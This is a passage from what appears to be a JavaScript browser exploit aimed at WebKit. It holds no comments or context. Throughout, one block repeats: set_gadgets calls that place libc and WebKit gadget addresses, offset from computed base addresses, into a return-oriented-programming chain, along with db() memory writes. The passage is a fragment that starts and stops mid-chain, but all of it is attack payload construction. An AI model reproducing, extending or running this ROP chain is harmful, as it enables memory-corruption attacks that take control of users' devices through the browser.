ropchain+263128, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+263200, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+263272, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+263344, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+263416, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+263488, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+263560, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+263632, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+263704, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+263776, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+263848, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+263920, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+263992, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264064, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264136, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264208, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264280, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264352, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264424, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264496, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264568, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264640, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264712, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264784, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264856, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+264928, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265000, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265072, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265144, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265216, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265288, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265360, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265432, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265504, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265576, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265648, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265720, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265792, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265864, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+265936, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266008, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266080, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266152, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266224, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266296, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266368, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266440, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266512, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266584, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266656, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266728, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266800, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266872, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+266944, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267016, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267088, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267160, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267232, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267304, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267376, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267448, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267520, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267592, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267664, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267736, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267808, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267880, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+267952, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268024, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268096, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268168, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268240, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268312, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268384, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268456, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268528, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268600, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268672, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268744, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268816, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268888, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+268960, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269032, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269104, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269176, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269248, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269320, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269392, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269464, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269536, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269608, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269680, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269752, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269824, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269896, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+269968, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270040, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270112, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270184, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270256, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270328, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270400, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270472, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270544, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270616, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270688, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270760, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270832, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270904, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+270976, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271048, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271120, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271192, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271264, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271336, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271408, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271480, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271552, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271624, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271696, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271768, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271840, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271912, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+271984, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272056, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272128, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272200, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272272, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272344, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272416, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272488, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272560, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272632, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272704, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272776, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272848, 
webkit_base+7438103, 
libc_base+793877 
]);
db([1, 0]); 
set_gadget(libc_base+788575,); 
db([0, 0]); 
set_gadgets([
libc_base+547636, 
webkit_base+865136, 
libc_base+793877, 
ropchain+272920, 
webkit_base+7438103, 
libc_base+793877 
]);
